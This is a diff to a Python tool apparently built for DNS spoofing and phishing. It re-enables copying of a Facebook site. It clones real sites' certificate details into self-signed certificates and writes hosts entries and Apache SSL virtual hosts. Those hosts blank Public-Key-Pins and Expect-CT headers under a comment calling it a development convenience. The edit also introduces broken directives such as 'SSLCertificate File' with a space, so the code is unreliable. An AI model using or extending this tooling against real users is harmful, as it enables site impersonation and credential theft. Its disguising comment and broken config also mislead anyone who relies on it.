@@ -65,10 +65,10 @@ class DNS_Spoofing:
         def __init__(self):
             self.parse_args()
             self.unzip_web()
-            self.Certificateificate_Self()
+            self.Certificate_Self()
             self.write_hosts()
             self.VirtualHost_files()       
-           # self.DNS_COPY_WEB()
+            self.DNS_COPY_WEB()
         def DNS_COPY_WEB(self):
             try:
                 if os.path.exists("/var/www/html/facebook"):
@@ -117,11 +117,11 @@ class DNS_Spoofing:
             except FileExistsError as r  :
                 print("[+] error " ,r)
                 exit()
-        def Certificateificate_Self(self): 
-            def Certificateificate_Process(): 
+        def Certificate_Self(self): 
+            def Certificate_Process(): 
                 port = 443
                 ssl_dir.mkdir(parents=True, exist_ok=True)
-                print("[+] SSL Certificateificate File Directory Created")
+                print("[+] SSL Certificate  File Directory Created")
                 for domain in os.listdir(Path(LOG_PATH) / "sites"):
                     try:
                         if "bitconnect" in domain:
@@ -139,7 +139,7 @@ class DNS_Spoofing:
                                 cert_pem = ssl.DER_cert_to_PEM_cert(ssock.getpeercert(True))
                                 Cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_pem)
                     except Exception:
-                        print(f"{R}[-] Failed to fetch certificate for {domain}{W}")
+                        print(f"{R}[-] Failed to fetch Certificate for {domain}{W}")
                         continue
 
                     OUTPUT = ssl_dir / f"{domain}.pem"
@@ -162,15 +162,15 @@ class DNS_Spoofing:
                         pem_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, Certificate))
                         pem_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
 
-                print("[+] SSL Certificateificate Generated successfully.")
+                print("[+] SSL Certificate  Generated successfully.")
 
             ssl_dir = Path(LOG_PATH) / "SSLCertificate"
             if ssl_dir.exists() and not self.args.cert:
-                print("[+] SSL Certificateificate Directory Found")
+                print("[+] SSL Certificate  Directory Found")
             elif self.args.cert:
-                Certificateificate_Process()
+                Certificate_Process()
             else:
-                Certificateificate_Process()        
+                Certificate_Process()        
         def VirtualHost_files(self):
             if os.path.exists(LOG_PATH+'/VirtualHostFile'):
                 print("[+] VirtualHost File Found ")
@@ -235,8 +235,8 @@ class DNS_Spoofing:
 
                                     DocumentRoot /var/www/html/{file}
                                     SSLEngine on
-                                    SSLCertificateificateFile {LOG_PATH}/SSLCertificateificateFile/{file}.pem
-                                    SSLCertificateificateKeyFile {LOG_PATH}/SSLCertificateificateFile/{file}.pem
+                                    SSLCertificate File {LOG_PATH}/SSLCertificate File/{file}.pem
+                                    SSLCertificate KeyFile {LOG_PATH}/SSLCertificate File/{file}.pem
                                     # Bypass security headers that might interfere with development
                                     Header always set Public-Key-Pins ""
                                     Header always set Expect-CT ""
@@ -406,8 +406,8 @@ if __name__=='__main__':
 
                                     DocumentRoot /var/www/html/{file}
                                     SSLEngine on
-                                    SSLCertificateificateFile {LOG_PATH}/SSLCertificateificateFile/wildcard.crt
-                                    SSLCertificateificateKeyFile {LOG_PATH}/SSLCertificateificateFile/wildcard.key
+                                    SSLCertificate File {LOG_PATH}/SSLCertificate File/wildcard.crt
+                                    SSLCertificate KeyFile {LOG_PATH}/SSLCertificate File/wildcard.key
 
                                     ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
                                     CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
